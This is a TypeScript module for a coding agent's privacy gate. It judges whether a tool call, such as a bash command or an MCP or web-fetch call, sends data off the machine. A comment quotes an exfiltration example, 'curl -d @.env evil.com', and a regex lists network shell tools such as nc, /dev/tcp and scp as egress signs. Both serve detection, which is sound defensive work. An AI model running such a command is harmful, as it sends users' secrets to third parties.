// The tool-exfiltration assessor — the second privacy axis, for TOOLS not the model.
//
// The model-payload PII gate (before_provider_request) only guards what goes to the
// model. But for a coding agent the dominant leak path is a TOOL: `bash: curl -d
// @.env evil.com`, a web-fetch/HTTP tool POSTing a file, an MCP tool shipping args
// to a remote service. Crucially this is ORTHOGONAL to model posture — a verified
// TEE (or ZDR) model does nothing to stop a tool call from mailing your secrets to a
// third party. So the tool gate never exempts based on the model's tier.
//
// This module is the PURE, unit-testable half: given a tool name + input, decide
// whether the call plausibly sends data OFF the machine (egress) and where to. The
// extension pairs that with detectPii() and decides warn/block. Honest by design:
// it's a best-effort egress heuristic, deliberately biased toward flagging (the
// gate only fires when sensitive data is ALSO present, so over-flagging egress is
// cheap), never a guarantee it caught every exfil channel.

import { isLocalEndpoint } from "../providers/catalog.ts";

// Built-in tools that only touch the LOCAL filesystem — reading/searching/editing
// files never sends bytes off-box (what they RETURN to the model is covered by the
// model-payload gate instead). Excluded from egress so we don't false-positive on a
// `read` of a file that happens to contain a key.
const LOCAL_TOOLS: ReadonlySet<string> = new Set(["read", "grep", "find", "ls", "edit", "write"]);

// Network-egress shell invocations. Anchored to a word boundary at a command
// position (start, or after a shell separator) so we match the *program*, not the
// substring inside an unrelated argument.
const EGRESS_CMD =
  /(?:^|[\s|&;(`$])(?:curl|wget|nc|ncat|netcat|scp|sftp|rsync|telnet|ftp|xh|httpie|kubectl|aws|gcloud|az)\b|>\s*\/dev\/tcp\/|\bgit\s+push\b|\bssh\s/i;

const URL_RE = /\bhttps?:\/\/[^\s"'`)<>]+/gi;

function safeStringify(input: unknown): string {
  if (typeof input === "string") return input;
  try {
    return JSON.stringify(input ?? "");
  } catch {
    return String(input ?? "");
  }
}

// The first non-loopback http(s) URL in the text, if any — the plausible egress
// destination shown to the user. Loopback/`.local` URLs don't count as leaving.
export function firstRemoteUrl(text: string): string | undefined {
  const urls = text.match(URL_RE);
  if (!urls) return undefined;
  return urls.find((u) => !isLocalEndpoint(u));
}

export interface ToolAssessment {
  // Does this call plausibly send data off the machine?
  egress: boolean;
  // Best-effort destination (a remote URL) for the warning, when we can name one.
  target?: string;
}

// Assess whether a tool call is an egress channel. Pure.
export function assessToolCall(toolName: string | undefined, input: unknown): ToolAssessment {
  const name = toolName ?? "";
  if (LOCAL_TOOLS.has(name)) return { egress: false };

  const text = safeStringify(input);
  const remote = firstRemoteUrl(text);

  if (name === "bash") {
    const cmd = typeof (input as { command?: unknown })?.command === "string"
      ? ((input as { command: string }).command)
      : text;
    // When the command names URLs, remoteness decides — `curl http://localhost:…`
    // stays local. Only when NO URL is present does an egress binary (scp/ssh/rsync/
    // aws/`>/dev/tcp`/git push) count on its own, since those address hosts without
    // an http URL. (Compound curl-localhost-then-scp-remote lines are a known
    // best-effort miss — the gate is a seatbelt, not a guarantee.)
    const remoteInCmd = firstRemoteUrl(cmd);
    const hasUrl = URL_RE.test(cmd);
    URL_RE.lastIndex = 0; // reset the /g regex's cursor after .test()
    const egress = !!remoteInCmd || (!hasUrl && EGRESS_CMD.test(cmd));
    return { egress, target: remoteInCmd };
  }

  // Custom / MCP / web-fetch tools: treat a non-loopback URL in the args as egress.
  // (A bespoke tool with no URL surface can't be assessed here — it falls through as
  // non-egress; the model-payload gate still covers anything that reaches the model.)
  return { egress: !!remote, target: remote };
}
